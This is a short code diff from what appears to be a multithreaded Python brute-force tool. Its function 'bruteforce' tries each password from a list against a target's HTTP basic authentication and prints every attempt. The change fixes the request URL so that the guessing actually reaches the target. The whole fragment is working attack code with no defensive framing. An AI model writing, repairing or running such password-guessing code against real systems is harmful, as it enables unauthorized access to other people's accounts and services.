@@ -66,7 +66,7 @@ def bruteforce(target, passwords, username, threadID):
 			
 			password = str(password.rstrip())
 			proxies = {'http': '','https': ''}
-			test = requests.get('http://',target, auth=(username, password))
+			test = requests.get('http://'+target, auth=(username, password))
 			code = test.status_code
 			
 			print  ('THREAD[',threadID,']         USER[',username,']          PASS [',password,']')
